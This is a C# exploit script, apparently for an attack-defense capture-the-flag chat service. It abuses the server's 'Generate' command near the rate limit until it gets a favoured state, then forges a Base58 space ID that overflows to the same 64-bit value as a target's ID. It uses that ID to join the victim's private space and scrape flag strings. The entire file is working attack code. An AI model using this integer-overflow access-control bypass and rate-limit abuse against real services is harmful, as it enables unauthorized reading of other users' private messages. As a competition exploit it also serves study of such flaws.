using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Numerics;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;

JsonSerializerOptions jsonOptions = new()
{
    IncludeFields = true,
    DefaultBufferSize = 1024,
    PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
    DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingDefault,
    Converters = { new JsonStringEnumConverter(JsonNamingPolicy.CamelCase) }
};

var cts = new CancellationTokenSource();

var hostAndPort = args[0];
bool useSavedState = false;
var cookies = new CookieContainer();
await using var stateStream = new FileStream("cookie.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read);
if(stateStream.Length > 0)
{
    using var reader = new StreamReader(stateStream);
    cookies.Add(new Cookie("usr", await reader.ReadToEndAsync(), null, hostAndPort.Split(':')[0]));
    useSavedState = true;
}

using var hc = new HttpClient(new SocketsHttpHandler
{
    UseCookies = true,
    CookieContainer = cookies,
    ConnectCallback = async (ctx, ct) =>
    {
        var s = new Socket(SocketType.Stream, ProtocolType.Tcp) { NoDelay = false };
        try
        {
            await s.ConnectAsync(ctx.DnsEndPoint, ct);
            return new NetworkStream(s, ownsSocket: true);
        }
        catch
        {
            s.Dispose();
            throw;
        }
    }
});

var ws1 = new ClientWebSocket();
await ws1.ConnectAsync(new Uri($"ws://{hostAndPort}/ws"), hc, CancellationToken.None);

var cookie = cookies.GetAllCookies().FirstOrDefault(c => c.Name == "usr")?.Value;
await Console.Error.WriteLineAsync("Cookie: " + cookie);

var flagRegex = new Regex(@"^TEAM\d{1,3}_[A-Z0-9]{32}$", RegexOptions.Compiled | RegexOptions.CultureInvariant);

long count = 0L;
CreateRecvThread(ws1).Start();

if(!useSavedState)
{
    await Task.Delay(1000);
    try
    {
        var msg = JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Generate, null), jsonOptions);
        for(int k = 0; k < 10; k++)
        {
            for(int i = 0; i <= 595; i++) // Use the number of iterations close to limit per minute
            {
                await ws1.SendAsync(msg, WebSocketMessageType.Text, true, cts.Token);
                if(i % 100 == 0) await Console.Error.WriteLineAsync($"send {i} msgs");
            }

            await Task.Delay(60 * 1000, cts.Token);
        }

        await Console.Error.WriteLineAsync("PWN FAILED");
        Environment.Exit(1);
    }
    catch(Exception e) when(e is TaskCanceledException or OperationCanceledException)
    {
        await Console.Error.WriteLineAsync("PWNED IN " + Interlocked.Read(ref count));
    }

    await Task.Delay(1000);
    await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Join, null), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);

    await using var writer = new StreamWriter(stateStream);
    writer.Write(cookie);
}

await Task.Delay(1000);

var context = args[1];
var spaceIdToPwn = context.Split('/')[0];
var pwn = FindOverflowedEqualValue(spaceIdToPwn);
await Console.Error.WriteLineAsync("" + pwn);

await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Room, pwn), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
await Task.Delay(1000);
await Console.Error.WriteLineAsync("===== SECOND WS CONNECTION =====");

var ws2 = new ClientWebSocket();
await ws2.ConnectAsync(new Uri($"ws://{hostAndPort}/ws"), CancellationToken.None);

CreateRecvThread(ws2).Start();

await ws2.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Join, pwn), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
if(context.Contains('/'))
{
    await Task.Delay(1000);
    var room = context.Split('/').Last();
    await ws2.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Room, room), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
}

await Task.Delay(3000);

string FindOverflowedEqualValue(string spaceIdToPwn)
{
    if(!Base58.TryDecodeUInt64(spaceIdToPwn, out var value))
        throw new Exception("Invalid input");

    var x = new BigInteger(value);

    // Start finding Base58 string which decodes to the same Int64 from some random point greater than long.MaxValue
    Base58.TryDecodeBigInt("33333333333333333", out var from);
    for(int i = 0; i < 10005000; i++)
    {
        var add = from * i;
        var result = (x + add - (add & ulong.MaxValue)).ToBase58();
        if(!result.All(char.IsAsciiLetterLower))
            continue;

        if(!Base58.TryDecodeUInt64(result, out var check) || check != value)
            throw new Exception("Auto check failed");

        return result;
    }

    throw new Exception("Attempts limit exceeded");
}

// Processing received messages
Thread CreateRecvThread(WebSocket ws) => new(async () =>
{
    var buffer = new byte[4096];
    while(ws.CloseStatus == null)
    {
        try
        {
            var result = await ws.ReceiveAsync(buffer, CancellationToken.None);
            if(result.MessageType == WebSocketMessageType.Close)
            {
                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, null, CancellationToken.None);
                return;
            }

            var c = Interlocked.Increment(ref count);
            if(c % 100 == 0)
                await Console.Error.WriteLineAsync($"recv {c} msgs");

            var msg = JsonSerializer.Deserialize<Message>(new ReadOnlySpan<byte>(buffer, 0, result.Count), jsonOptions);
            if(msg == null)
                continue;

            if(msg.Type == MsgType.Msg && msg.Text != null && flagRegex.IsMatch(msg.Text))
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                await Console.Out.WriteLineAsync(msg.Text);
                Console.ResetColor();
            }

            if(msg.Type != MsgType.Generate)
                await Console.Error.WriteLineAsync(Encoding.UTF8.GetString(buffer, 0, result.Count));
            else if(msg.Avatar != null && msg.Avatar.All(c => c == '0'))
                cts.Cancel();
        }
        catch(Exception e)
        {
            await Console.Error.WriteLineAsync(e.ToString());
        }
    }
});

record Command(MsgType Type, string? Data);
record Message(MsgType Type, string? Context, string? Author, string? Avatar, string? Text, DateTime Time);

public enum MsgType
{
    Error = 1,
    Generate,
    Close,
    Join,
    Room,
    Msg
}
